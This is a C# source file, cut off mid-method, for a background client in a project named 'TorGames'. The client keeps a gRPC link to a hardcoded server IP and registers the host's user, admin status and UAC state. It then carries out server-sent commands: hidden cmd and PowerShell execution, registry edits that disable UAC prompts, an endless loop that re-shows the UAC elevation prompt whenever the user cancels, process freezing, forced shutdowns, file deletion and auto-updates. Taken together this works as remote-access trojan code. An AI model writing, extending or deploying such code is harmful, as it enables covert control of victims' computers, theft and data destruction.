using System.ComponentModel;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text.Json;
using TorGames.Client.Models;
using Grpc.Core;
using Grpc.Net.Client;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using TorGames.Common.Hardware;
using TorGames.Common.Protos;

namespace TorGames.Client.Services;

/// <summary>
/// Background service that maintains a persistent gRPC connection to the server.
/// </summary>
public class GrpcClientService : BackgroundService
{
    private readonly ILogger<GrpcClientService> _logger;
    private readonly IConfiguration _configuration;
    private readonly string _clientType = "CLIENT";

    // JSON options for camelCase serialization (matching frontend expectations)
    private static readonly JsonSerializerOptions JsonOptions = new()
    {
        PropertyNamingPolicy = JsonNamingPolicy.CamelCase
    };
    private readonly TimeSpan _heartbeatInterval = TimeSpan.FromSeconds(10);
    private readonly TimeSpan _reconnectDelay = TimeSpan.FromSeconds(5);
    private readonly TimeSpan _updateCheckInterval = TimeSpan.FromMinutes(30);

    private GrpcChannel? _channel;
    private AsyncDuplexStreamingCall<ClientMessage, ServerMessage>? _call;
    private readonly Stopwatch _uptimeStopwatch = Stopwatch.StartNew();
    private UpdateService? _updateService;

    public GrpcClientService(ILogger<GrpcClientService> logger, IConfiguration configuration)
    {
        _logger = logger;
        _configuration = configuration;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        var serverAddress = _configuration["Server:Address"] ?? "http://localhost:5000";

        _logger.LogInformation("GrpcClientService starting. Server: {Address}", serverAddress);

        while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                await ConnectAndRunAsync(serverAddress, stoppingToken);
            }
            catch (OperationCanceledException) when (stoppingToken.IsCancellationRequested)
            {
                _logger.LogInformation("GrpcClientService shutting down");
                break;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Connection error. Reconnecting in {Delay} seconds...", _reconnectDelay.TotalSeconds);
                await Task.Delay(_reconnectDelay, stoppingToken);
            }
            finally
            {
                Cleanup();
            }
        }
    }

    private async Task ConnectAndRunAsync(string serverAddress, CancellationToken ct)
    {
        // Create channel with HTTP/2 (no TLS)
        _channel = GrpcChannel.ForAddress(serverAddress, new GrpcChannelOptions
        {
            HttpHandler = new SocketsHttpHandler
            {
                EnableMultipleHttp2Connections = true,
                KeepAlivePingDelay = TimeSpan.FromSeconds(60),
                KeepAlivePingTimeout = TimeSpan.FromSeconds(30)
            }
        });

        var client = new TorService.TorServiceClient(_channel);
        _call = client.Connect(cancellationToken: ct);

        // Initialize update service
        var serverApiUrl = _configuration["Server:ApiAddress"] ?? "http://144.91.111.101:5001";
        _updateService = new UpdateService(_logger, serverApiUrl);

        // Send registration
        var clientId = MachineFingerprint.GetFingerprint();
        await SendRegistrationAsync(clientId, ct);

        // Wait for connection response
        if (!await _call.ResponseStream.MoveNext(ct))
        {
            throw new InvalidOperationException("Server closed connection before responding");
        }

        var response = _call.ResponseStream.Current;
        if (response.PayloadCase == ServerMessage.PayloadOneofCase.ConnectionResponse)
        {
            if (!response.ConnectionResponse.Accepted)
            {
                _logger.LogError("Connection rejected: {Reason}", response.ConnectionResponse.RejectionReason);
                throw new InvalidOperationException($"Connection rejected: {response.ConnectionResponse.RejectionReason}");
            }

            _logger.LogInformation("Connected to server successfully. ClientId: {ClientId}", clientId);
        }

        // Check for updates on startup
        await CheckForUpdateOnStartupAsync(ct);

        // Start receiving messages in background
        var receiveTask = ReceiveMessagesAsync(ct);

        // Start periodic update check in background
        var updateCheckTask = PeriodicUpdateCheckAsync(ct);

        // Send heartbeats
        while (!ct.IsCancellationRequested)
        {
            await SendHeartbeatAsync(ct);
            await Task.Delay(_heartbeatInterval, ct);
        }

        await Task.WhenAll(receiveTask, updateCheckTask);
    }

    private async Task SendRegistrationAsync(string clientId, CancellationToken ct)
    {
        var registration = new Registration
        {
            MachineName = Environment.MachineName,
            OsVersion = Environment.OSVersion.ToString(),
            OsArchitecture = Environment.Is64BitOperatingSystem ? "x64" : "x86",
            CpuCount = Environment.ProcessorCount,
            TotalMemoryBytes = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes,
            Username = Environment.UserName,
            ClientVersion = GetClientVersion(),
            IpAddress = GetLocalIpAddress(),
            MacAddress = GetPrimaryMacAddress(),
            IsAdmin = IsRunningAsAdmin(),
            CountryCode = GetCountryCode(),
            IsUacEnabled = IsUacEnabled()
        };

        var message = new ClientMessage
        {
            ClientId = clientId,
            ClientType = _clientType,
            Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
            Registration = registration
        };

        await _call!.RequestStream.WriteAsync(message, ct);
        _logger.LogDebug("Registration sent");
    }

    private async Task SendHeartbeatAsync(CancellationToken ct)
    {
        var heartbeat = new Heartbeat
        {
            UptimeSeconds = (long)_uptimeStopwatch.Elapsed.TotalSeconds,
            CpuUsagePercent = 0, // TODO: Implement CPU monitoring
            AvailableMemoryBytes = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes - GC.GetTotalMemory(false)
        };

        var message = new ClientMessage
        {
            ClientId = MachineFingerprint.GetFingerprint(),
            ClientType = _clientType,
            Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
            Heartbeat = heartbeat
        };

        await _call!.RequestStream.WriteAsync(message, ct);
        _logger.LogDebug("Heartbeat sent");
    }

    private async Task CheckForUpdateOnStartupAsync(CancellationToken ct)
    {
        try
        {
            _logger.LogInformation("Checking for updates on startup...");

            if (_updateService != null)
            {
                var latestVersion = await _updateService.CheckForUpdateAsync();

                if (latestVersion != null)
                {
                    _logger.LogInformation("Update available on startup: {Version}. Applying automatically...", latestVersion.Version);

                    // Gracefully disconnect before updating
                    await DisconnectGracefullyAsync();

                    await _updateService.ApplyUpdateAsync(latestVersion);
                    // ApplyUpdateAsync exits the process, so we won't reach here
                }
                else
                {
                    _logger.LogInformation("No updates available. Current version: {Version}", _updateService.CurrentVersion);
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogWarning(ex, "Startup update check failed, continuing normal operation");
        }
    }

    private async Task PeriodicUpdateCheckAsync(CancellationToken ct)
    {
        // Wait before first periodic check (startup check already done)
        await Task.Delay(_updateCheckInterval, ct);

        while (!ct.IsCancellationRequested)
        {
            try
            {
                _logger.LogDebug("Performing periodic update check...");

                if (_updateService != null)
                {
                    var latestVersion = await _updateService.CheckForUpdateAsync();

                    if (latestVersion != null)
                    {
                        _logger.LogInformation("Update available: {Version}. Applying automatically...", latestVersion.Version);

                        // Gracefully disconnect before updating
                        await DisconnectGracefullyAsync();

                        await _updateService.ApplyUpdateAsync(latestVersion);
                        // ApplyUpdateAsync exits the process, so we won't reach here
                    }
                }
            }
            catch (OperationCanceledException) when (ct.IsCancellationRequested)
            {
                break;
            }
            catch (Exception ex)
            {
                _logger.LogWarning(ex, "Periodic update check failed");
            }

            await Task.Delay(_updateCheckInterval, ct);
        }
    }

    private async Task ReceiveMessagesAsync(CancellationToken ct)
    {
        try
        {
            await foreach (var message in _call!.ResponseStream.ReadAllAsync(ct))
            {
                await ProcessServerMessageAsync(message, ct);
            }
        }
        catch (OperationCanceledException) when (ct.IsCancellationRequested)
        {
            // Expected during shutdown
        }
        catch (RpcException ex) when (ex.StatusCode == StatusCode.Cancelled)
        {
            // Expected during shutdown
        }
    }

    private async Task ProcessServerMessageAsync(ServerMessage message, CancellationToken ct)
    {
        switch (message.PayloadCase)
        {
            case ServerMessage.PayloadOneofCase.Command:
                await HandleCommandAsync(message.Command, ct);
                break;

            case ServerMessage.PayloadOneofCase.Ping:
                _logger.LogDebug("Received ping from server");
                break;

            case ServerMessage.PayloadOneofCase.ConfigUpdate:
                HandleConfigUpdate(message.ConfigUpdate);
                break;

            case ServerMessage.PayloadOneofCase.FileTransfer:
                await HandleFileTransferAsync(message.FileTransfer, ct);
                break;

            default:
                _logger.LogWarning("Unknown message type: {PayloadCase}", message.PayloadCase);
                break;
        }
    }

    private async Task HandleCommandAsync(Command command, CancellationToken ct)
    {
        _logger.LogInformation("Received command: {CommandType} (ID: {CommandId})", command.CommandType, command.CommandId);

        var result = new CommandResult
        {
            CommandId = command.CommandId,
            Success = false
        };

        try
        {
            switch (command.CommandType.ToLowerInvariant())
            {
                case "shell":
                case "cmd":
                    result = await ExecuteShellCommandAsync(command, "cmd.exe", "/c");
                    break;

                case "powershell":
                case "ps":
                    result = await ExecuteShellCommandAsync(command, "powershell.exe", "-Command");
                    break;

                case "metrics":
                    await SendMetricsAsync(ct);
                    result.Success = true;
                    break;

                case "systeminfo":
                    await SendDetailedSystemInfoAsync(command.CommandId, ct);
                    result.Success = true;
                    return; // Don't send CommandResult, we send DetailedSystemInfo instead

                case "disableuac":
                    result = await DisableUacAsync(command);
                    break;

                case "shutdown":
                    result = ExecutePowerCommand(command, "/s /f /t 0");
                    break;

                case "restart":
                    result = ExecutePowerCommand(command, "/r /f /t 0");
                    break;

                case "signout":
                    result = ExecutePowerCommand(command, "/l");
                    break;

                case "update":
                    result = await HandleUpdateCommandAsync(command, ct);
                    break;

                case "update_available":
                    result = await HandleUpdateAvailableAsync(command, ct);
                    break;

                case "freezeprocess":
                    result = await FreezeProcessAsync(command);
                    break;

                case "resumeprocess":
                    result = await ResumeProcessAsync(command);
                    break;

                case "server_shutdown":
                    _logger.LogInformation("Server is shutting down: {Message}", command.CommandText);
                    result.Success = true;
                    result.Stdout = "Acknowledged server shutdown";
                    break;

                case "getlogs":
                    result = GetClientLogs(command);
                    break;

                case "elevate":
                    result = await HandleElevationRequestAsync(command);
                    break;

                // File Explorer commands
                case "listdrives":
                    result = ListDrives(command);
                    break;

                case "listdir":
                    result = ListDirectory(command);
                    break;

                case "createfolder":
                    result = CreateFolder(command);
                    break;

                case "createfile":
                    result = CreateFile(command);
                    break;

                case "deletepath":
                    result = DeletePath(command);
                    break;

                case "renamepath":
                    result = RenamePath(command);
                    break;

                case "copypath":
                    result = CopyPath(command);
                    break;

                case "movepath":
                    result = MovePath(command);
                    break;

                default:
                    result.ErrorMessage = $"Unknown command type: {command.CommandType}";
                    _logger.LogWarning("Unknown command type: {CommandType}", command.CommandType);
                    break;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Error executing command {CommandId}", command.CommandId);
        }

        // Send result back
        await SendCommandResultAsync(result, ct);
    }

    private async Task<CommandResult> ExecuteShellCommandAsync(Command command, string shell, string shellArg)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            using var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = shell,
                    Arguments = $"{shellArg} \"{command.CommandText}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            process.Start();

            var timeout = command.TimeoutSeconds > 0
                ? TimeSpan.FromSeconds(command.TimeoutSeconds)
                : TimeSpan.FromMinutes(5);

            var completed = process.WaitForExit(timeout);

            if (!completed)
            {
                process.Kill(true);
                result.Success = false;
                result.ErrorMessage = "Command timed out";
                return result;
            }

            result.Stdout = await process.StandardOutput.ReadToEndAsync();
            result.Stderr = await process.StandardError.ReadToEndAsync();
            result.ExitCode = process.ExitCode;
            result.Success = process.ExitCode == 0;
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
        }

        return result;
    }

    private async Task SendCommandResultAsync(CommandResult result, CancellationToken ct)
    {
        var message = new ClientMessage
        {
            ClientId = MachineFingerprint.GetFingerprint(),
            ClientType = _clientType,
            Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
            CommandResult = result
        };

        await _call!.RequestStream.WriteAsync(message, ct);
    }

    private async Task SendMetricsAsync(CancellationToken ct)
    {
        var metrics = new SystemMetrics
        {
            CpuUsagePercent = 0, // TODO: Implement
            AvailableMemoryBytes = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes - GC.GetTotalMemory(false),
            DiskFreeBytes = 0 // TODO: Implement
        };

        var message = new ClientMessage
        {
            ClientId = MachineFingerprint.GetFingerprint(),
            ClientType = _clientType,
            Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
            Metrics = metrics
        };

        await _call!.RequestStream.WriteAsync(message, ct);
    }

    private async Task SendDetailedSystemInfoAsync(string requestId, CancellationToken ct)
    {
        _logger.LogInformation("Collecting detailed system information for request {RequestId}...", requestId);

        var systemInfo = SystemInfoCollector.CollectAll();
        systemInfo.RequestId = requestId;

        var message = new ClientMessage
        {
            ClientId = MachineFingerprint.GetFingerprint(),
            ClientType = _clientType,
            Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
            DetailedSystemInfo = systemInfo
        };

        await _call!.RequestStream.WriteAsync(message, ct);

        _logger.LogInformation("Detailed system information sent for request {RequestId}", requestId);
    }

    private async Task<CommandResult> DisableUacAsync(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            _logger.LogInformation("Disabling UAC prompts...");

            // Disable UAC prompts for admins (ConsentPromptBehaviorAdmin = 0)
            var p1 = Process.Start(new ProcessStartInfo
            {
                FileName = "reg.exe",
                Arguments = @"ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            });
            p1?.WaitForExit(5000);
            var exitCode1 = p1?.ExitCode ?? -1;

            // Disable secure desktop (PromptOnSecureDesktop = 0)
            var p2 = Process.Start(new ProcessStartInfo
            {
                FileName = "reg.exe",
                Arguments = @"ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            });
            p2?.WaitForExit(5000);
            var exitCode2 = p2?.ExitCode ?? -1;

            if (exitCode1 == 0 && exitCode2 == 0)
            {
                result.Success = true;
                result.Stdout = "UAC prompts disabled successfully. No reboot required.";
                _logger.LogInformation("UAC prompts disabled successfully");
            }
            else
            {
                result.Success = false;
                result.ErrorMessage = $"Registry commands failed. Exit codes: {exitCode1}, {exitCode2}. Ensure running as Administrator.";
                _logger.LogWarning("Failed to disable UAC. Exit codes: {Code1}, {Code2}", exitCode1, exitCode2);
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Error disabling UAC");
        }

        return result;
    }

    private CommandResult ExecutePowerCommand(Command command, string arguments)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            _logger.LogInformation("Executing power command: shutdown {Arguments}", arguments);

            Process.Start(new ProcessStartInfo
            {
                FileName = "shutdown",
                Arguments = arguments,
                UseShellExecute = false,
                CreateNoWindow = true
            });

            result.Success = true;
            result.Stdout = $"Power command executed: shutdown {arguments}";
            _logger.LogInformation("Power command sent successfully");
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Error executing power command");
        }

        return result;
    }

    private void HandleConfigUpdate(ConfigUpdate config)
    {
        _logger.LogInformation("Received config update with {Count} settings", config.Settings.Count);
        // TODO: Apply configuration changes
    }

    private Task HandleFileTransferAsync(FileTransferRequest request, CancellationToken ct)
    {
        _logger.LogInformation("Received file transfer request: {TransferId}, Upload: {IsUpload}",
            request.TransferId, request.IsUpload);
        // TODO: Implement file transfer handling
        return Task.CompletedTask;
    }

    /// <summary>
    /// Get client logs from the circular buffer.
    /// </summary>
    private CommandResult GetClientLogs(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            // Parse optional line count from command text
            int maxLines = 200; // Default
            if (!string.IsNullOrWhiteSpace(command.CommandText) &&
                int.TryParse(command.CommandText.Trim(), out var requestedLines))
            {
                maxLines = Math.Min(requestedLines, 500); // Cap at 500
            }

            var logs = LogBuffer.Instance.GetLogs(maxLines);

            result.Success = true;
            result.Stdout = string.IsNullOrEmpty(logs)
                ? "[No logs available]"
                : logs;

            _logger.LogDebug("Retrieved {Count} log entries", LogBuffer.Instance.Count);
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = $"Failed to get logs: {ex.Message}";
        }

        return result;
    }

    /// <summary>
    /// Request elevation by launching a new instance with runas verb.
    /// Shows UAC prompt immediately and retries infinitely if cancelled.
    /// </summary>
    private async Task<CommandResult> HandleElevationRequestAsync(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        // Already admin? No-op
        if (IsRunningAsAdmin())
        {
            result.Success = true;
            result.Stdout = "Already running as administrator";
            _logger.LogInformation("Elevation requested but already running as admin");
            return result;
        }

        _logger.LogInformation("Elevation requested. Starting UAC prompt loop...");

        var attempts = 0;
        while (true)
        {
            attempts++;
            _logger.LogInformation("Elevation attempt {Attempt}", attempts);

            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = Environment.ProcessPath,
                    Verb = "runas",
                    UseShellExecute = true,
                    Arguments = "--elevated"
                };

                Process.Start(startInfo);

                // Success - elevated process started, exit this one
                _logger.LogInformation("Elevation successful, exiting non-admin instance");
                result.Success = true;
                result.Stdout = "Elevation successful, new admin instance started";

                // Give a moment for the elevated instance to start
                await Task.Delay(1000);

                // Exit the current non-admin process
                Environment.Exit(0);
            }
            catch (Win32Exception ex) when (ex.NativeErrorCode == 1223)
            {
                // ERROR_CANCELLED - User clicked Cancel, immediately retry
                _logger.LogWarning("User cancelled UAC prompt, retrying immediately...");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Elevation failed");
                result.Success = false;
                result.ErrorMessage = $"Elevation failed: {ex.Message}";
                return result;
            }
        }
    }

    #region File Explorer Commands

    /// <summary>
    /// List all available drives on the system.
    /// </summary>
    private CommandResult ListDrives(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            var drives = DriveInfo.GetDrives()
                .Where(d => d.IsReady)
                .Select(d => new FileEntryDto
                {
                    Name = d.Name.TrimEnd('\\'),
                    FullPath = d.Name,
                    Type = "drive",
                    SizeBytes = d.TotalSize,
                    Extension = d.DriveFormat,
                    IsDirectory = true
                }).ToList();

            result.Success = true;
            result.Stdout = JsonSerializer.Serialize(new DirectoryListingDto
            {
                Path = "",
                Entries = drives,
                Success = true
            }, JsonOptions);

            _logger.LogDebug("Listed {Count} drives", drives.Count);
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Failed to list drives");
        }

        return result;
    }

    /// <summary>
    /// List contents of a directory.
    /// </summary>
    private CommandResult ListDirectory(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            var path = command.CommandText;
            var entries = new List<FileEntryDto>();

            // Add directories first
            foreach (var dir in Directory.GetDirectories(path))
            {
                try
                {
                    var info = new DirectoryInfo(dir);
                    entries.Add(new FileEntryDto
                    {
                        Name = info.Name,
                        FullPath = info.FullName,
                        Type = "directory",
                        CreatedTime = info.CreationTime,
                        ModifiedTime = info.LastWriteTime,
                        IsDirectory = true,
                        IsHidden = (info.Attributes & FileAttributes.Hidden) != 0,
                        IsSystem = (info.Attributes & FileAttributes.System) != 0
                    });
                }
                catch
                {
                    // Skip directories we can't access
                }
            }

            // Add files
            foreach (var file in Directory.GetFiles(path))
            {
                try
                {
                    var info = new FileInfo(file);
                    entries.Add(new FileEntryDto
                    {
                        Name = info.Name,
                        FullPath = info.FullName,
                        Type = "file",
                        SizeBytes = info.Length,
                        Extension = info.Extension,
                        CreatedTime = info.CreationTime,
                        ModifiedTime = info.LastWriteTime,
                        IsReadOnly = info.IsReadOnly,
                        IsHidden = (info.Attributes & FileAttributes.Hidden) != 0,
                        IsSystem = (info.Attributes & FileAttributes.System) != 0
                    });
                }
                catch
                {
                    // Skip files we can't access
                }
            }

            result.Success = true;
            result.Stdout = JsonSerializer.Serialize(new DirectoryListingDto
            {
                Path = path,
                Entries = entries,
                Success = true
            }, JsonOptions);

            _logger.LogDebug("Listed {Count} items in {Path}", entries.Count, path);
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Failed to list directory: {Path}", command.CommandText);
        }

        return result;
    }

    /// <summary>
    /// Create a new folder.
    /// </summary>
    private CommandResult CreateFolder(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            Directory.CreateDirectory(command.CommandText);
            result.Success = true;
            result.Stdout = $"Folder created: {command.CommandText}";
            _logger.LogInformation("Created folder: {Path}", command.CommandText);
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Failed to create folder: {Path}", command.CommandText);
        }

        return result;
    }

    /// <summary>
    /// Create a new empty file.
    /// </summary>
    private CommandResult CreateFile(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            File.Create(command.CommandText).Dispose();
            result.Success = true;
            result.Stdout = $"File created: {command.CommandText}";
            _logger.LogInformation("Created file: {Path}", command.CommandText);
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Failed to create file: {Path}", command.CommandText);
        }

        return result;
    }

    /// <summary>
    /// Delete a file or directory.
    /// </summary>
    private CommandResult DeletePath(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            var path = command.CommandText;

            if (Directory.Exists(path))
            {
                Directory.Delete(path, recursive: true);
                result.Stdout = $"Directory deleted: {path}";
            }
            else if (File.Exists(path))
            {
                File.Delete(path);
                result.Stdout = $"File deleted: {path}";
            }
            else
            {
                result.Success = false;
                result.ErrorMessage = "Path not found";
                return result;
            }

            result.Success = true;
            _logger.LogInformation("Deleted: {Path}", path);
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Failed to delete: {Path}", command.CommandText);
        }

        return result;
    }

    /// <summary>
    /// Rename a file or directory.
    /// Command format: "oldPath|newName"
    /// </summary>
    private CommandResult RenamePath(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            var parts = command.CommandText.Split('|');
            if (parts.Length != 2)
            {
                result.Success = false;
                result.ErrorMessage = "Invalid format. Expected: oldPath|newName";
                return result;
            }

            var oldPath = parts[0];
            var newName = parts[1];
            var parentDir = Path.GetDirectoryName(oldPath) ?? "";
            var newPath = Path.Combine(parentDir, newName);

            if (Directory.Exists(oldPath))
            {
                Directory.Move(oldPath, newPath);
            }
            else if (File.Exists(oldPath))
            {
                File.Move(oldPath, newPath);
            }
            else
            {
                result.Success = false;
                result.ErrorMessage = "Path not found";
                return result;
            }

            result.Success = true;
            result.Stdout = newPath;
            _logger.LogInformation("Renamed {OldPath} to {NewPath}", oldPath, newPath);
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Failed to rename: {Path}", command.CommandText);
        }

        return result;
    }

    /// <summary>
    /// Copy a file or directory.
    /// Command format: "sourcePath|destinationPath"
    /// </summary>
    private CommandResult CopyPath(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            var parts = command.CommandText.Split('|');
            if (parts.Length != 2)
            {
                result.Success = false;
                result.ErrorMessage = "Invalid format. Expected: sourcePath|destinationPath";
                return result;
            }

            var source = parts[0];
            var dest = parts[1];

            if (Directory.Exists(source))
            {
                CopyDirectoryRecursive(source, dest);
            }
            else if (File.Exists(source))
            {
                File.Copy(source, dest, overwrite: true);
            }
            else
            {
                result.Success = false;
                result.ErrorMessage = "Source path not found";
                return result;
            }

            result.Success = true;
            result.Stdout = $"Copied to: {dest}";
            _logger.LogInformation("Copied {Source} to {Dest}", source, dest);
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Failed to copy: {Path}", command.CommandText);
        }

        return result;
    }

    /// <summary>
    /// Move a file or directory.
    /// Command format: "sourcePath|destinationPath"
    /// </summary>
    private CommandResult MovePath(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            var parts = command.CommandText.Split('|');
            if (parts.Length != 2)
            {
                result.Success = false;
                result.ErrorMessage = "Invalid format. Expected: sourcePath|destinationPath";
                return result;
            }

            var source = parts[0];
            var dest = parts[1];

            if (Directory.Exists(source))
            {
                Directory.Move(source, dest);
            }
            else if (File.Exists(source))
            {
                File.Move(source, dest, overwrite: true);
            }
            else
            {
                result.Success = false;
                result.ErrorMessage = "Source path not found";
                return result;
            }

            result.Success = true;
            result.Stdout = $"Moved to: {dest}";
            _logger.LogInformation("Moved {Source} to {Dest}", source, dest);
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Failed to move: {Path}", command.CommandText);
        }

        return result;
    }

    /// <summary>
    /// Helper to recursively copy a directory.
    /// </summary>
    private static void CopyDirectoryRecursive(string source, string dest)
    {
        Directory.CreateDirectory(dest);

        foreach (var file in Directory.GetFiles(source))
        {
            var destFile = Path.Combine(dest, Path.GetFileName(file));
            File.Copy(file, destFile, overwrite: true);
        }

        foreach (var dir in Directory.GetDirectories(source))
        {
            var destDir = Path.Combine(dest, Path.GetFileName(dir));
            CopyDirectoryRecursive(dir, destDir);
        }
    }

    #endregion

    private void Cleanup()
    {
        _call?.Dispose();
        _call = null;
        _channel?.Dispose();
        _channel = null;
    }

    private static string GetLocalIpAddress()
    {
        try
        {
            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                    return ip.ToString();
            }
        }
        catch { }
        return "0.0.0.0";
    }

    private static string GetPrimaryMacAddress()
    {
        try
        {
            var nic = NetworkInterface.GetAllNetworkInterfaces()
                .FirstOrDefault(n => n.OperationalStatus == OperationalStatus.Up
                                     && n.NetworkInterfaceType != NetworkInterfaceType.Loopback);
            return nic?.GetPhysicalAddress().ToString() ?? "000000000000";
        }
        catch { }
        return "000000000000";
    }

    private static bool IsRunningAsAdmin()
    {
        try
        {
            using var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        catch
        {
            return false;
        }
    }

    private static bool IsUacEnabled()
    {
        try
        {
            // Check registry for UAC status
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            if (key != null)
            {
                var enableLua = key.GetValue("EnableLUA");
                if (enableLua is int value)
                {
                    return value == 1;
                }
            }
            return true; // Default to enabled if we can't determine
        }
        catch
        {
            return true; // Assume enabled if we can't check
        }
    }

    private static string GetCountryCode()
    {
        try
        {
            // Get the current region from Windows settings
            var regionInfo = new System.Globalization.RegionInfo(
                System.Globalization.CultureInfo.CurrentCulture.Name);
            return regionInfo.TwoLetterISORegionName;
        }
        catch
        {
            return "XX"; // Unknown
        }
    }

    private static string GetClientVersion()
    {
        // Try to read from version file first (updated by updater)
        try
        {
            var versionFilePath = Path.Combine(AppContext.BaseDirectory, "TorGames.version");
            if (File.Exists(versionFilePath))
            {
                var fileVersion = File.ReadAllText(versionFilePath).Trim();
                if (!string.IsNullOrEmpty(fileVersion))
                {
                    return fileVersion;
                }
            }
        }
        catch
        {
            // Ignore errors reading version file
        }

        // Use the VersionInfo class (most reliable for single-file apps)
        return TorGames.Client.VersionInfo.Version;
    }

    // P/Invoke declarations for process suspend/resume
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSuspendProcess(IntPtr processHandle);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtResumeProcess(IntPtr processHandle);

    private async Task<CommandResult> FreezeProcessAsync(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            if (!int.TryParse(command.CommandText, out var pid))
            {
                result.Success = false;
                result.ErrorMessage = "Invalid PID format";
                return result;
            }

            _logger.LogInformation("Freezing process with PID: {Pid}", pid);

            var process = Process.GetProcessById(pid);
            var status = NtSuspendProcess(process.Handle);

            if (status == 0)
            {
                result.Success = true;
                result.Stdout = $"Process {process.ProcessName} (PID: {pid}) has been frozen";
                _logger.LogInformation("Process {ProcessName} (PID: {Pid}) frozen successfully", process.ProcessName, pid);
            }
            else
            {
                result.Success = false;
                result.ErrorMessage = $"Failed to freeze process. NTSTATUS: 0x{status:X8}";
                _logger.LogWarning("Failed to freeze process PID {Pid}. NTSTATUS: 0x{Status:X8}", pid, status);
            }
        }
        catch (ArgumentException)
        {
            result.Success = false;
            result.ErrorMessage = $"Process with PID {command.CommandText} not found";
            _logger.LogWarning("Process with PID {Pid} not found", command.CommandText);
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Error freezing process PID {Pid}", command.CommandText);
        }

        return await Task.FromResult(result);
    }

    private async Task<CommandResult> ResumeProcessAsync(Command command)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            if (!int.TryParse(command.CommandText, out var pid))
            {
                result.Success = false;
                result.ErrorMessage = "Invalid PID format";
                return result;
            }

            _logger.LogInformation("Resuming process with PID: {Pid}", pid);

            var process = Process.GetProcessById(pid);
            var status = NtResumeProcess(process.Handle);

            if (status == 0)
            {
                result.Success = true;
                result.Stdout = $"Process {process.ProcessName} (PID: {pid}) has been resumed";
                _logger.LogInformation("Process {ProcessName} (PID: {Pid}) resumed successfully", process.ProcessName, pid);
            }
            else
            {
                result.Success = false;
